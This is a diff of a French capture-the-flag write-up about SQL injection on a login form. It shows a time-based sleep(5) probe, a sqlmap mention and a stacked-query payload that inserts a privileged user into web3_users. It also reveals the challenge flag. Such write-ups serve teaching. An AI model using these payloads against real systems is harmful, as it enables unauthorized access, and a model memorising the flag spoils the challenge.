@@ -12,8 +12,8 @@ On essaie de se connecter sur d’autres comptes en faisant varier le paramètre
 Malheureusement aucun compte ne semble avoir le rang espéré. On va essayer de faire une requête à la
 suite de la requête principale:
 
-> SELECT something FROM table WHERE something = ‘$username’ AND something =’ $password’ ;
-DEUXIEME_REQUETE
+```sql
+SELECT something FROM table WHERE something = ‘$username’ AND something =’ $password’ ;DEUXIEME_REQUETE```
 
 
 On injecte donc avec: ‘ and sleep(5) # On remarque que le chargement de la page est beaucoup plus
@@ -42,7 +42,7 @@ sqlmap.py
 
 On a alors une table web3_users avec les colonnes: id, password, rank et username. Notre injection pour
 ajouter un nouvel utilisateur se résume alors à:
-> Login = ‘ ; INSERT INTO web3_users(id, username, password, rank) VALUES (987, ‘bob’,
-‘bob’, 1) #
+```sql
+Login = ' ; INSERT INTO web3_users(id, username, password, rank) VALUES (987,‘bob’,‘bob’, 1) #```
 
 On se connecte avec le compte créé et on obtient le flag: **ESE{St4cKeD_Qu3rIeS}**
